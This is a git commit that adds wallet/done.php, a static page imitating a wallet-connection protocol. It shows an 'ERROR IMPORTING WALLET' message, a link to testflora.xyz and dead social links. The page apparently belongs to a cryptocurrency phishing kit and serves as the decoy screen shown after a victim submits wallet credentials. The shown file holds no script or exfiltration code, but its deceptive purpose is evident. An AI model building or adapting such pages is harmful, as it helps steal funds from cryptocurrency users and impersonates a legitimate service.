788fb5367a16bb7c4e8e1dc4816a3ae2aeead2fa
zeddstech <39128666+zeddstech@users.noreply.github.com>
2022-05-05 08:17:14 -0500

    Add files via upload

---
+++ wallet/done.php
@@ -0,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <!-- <meta property="og:image" content="images/logo.svg"> -->
+    <!-- <link rel="icon" href="images/logo.svg"> -->
+    <!-- css -->
+    <link rel="stylesheet" href="css/main.css"/> 
+
+<title></title>
+</head>
+
+<body style="text-align:center;">
+
+<br>
+    <img src="images/frame.png" width="250px" height="250px">
+<br>
+<h2 style="color: crimson">ERROR IMPORTING WALLET</h2>
+ <a href="https://testflora.xyz">Back to Homepage</a> 
+
+<!-- footer -->
+<footer>
+    <div class="footer-wrapper" id="footer">
+    <p><img src="images/discord.svg" class="footimg" alt="discord icon">  <a href="#" rel="noreferrer noopener">Discord</a></p></br>
+    <p><img src="images/telegram.svg" class="footimg" alt="telegram icon">  <a href="#" rel="noreferrer noopener">Telegram</a></p></br>
+    <p><img src="images/twitter.svg" class="footimg" alt="twitter icon">  <a href="#" rel="noreferrer noopener">Twitter</a></p></br>
+    <p><img src="images/github.svg" class="footimg" alt="github icon">  <a href="#" rel="noreferrer noopener">Github</a></p></br>
+    </div>
+    </footer>
+</body>
+</html>
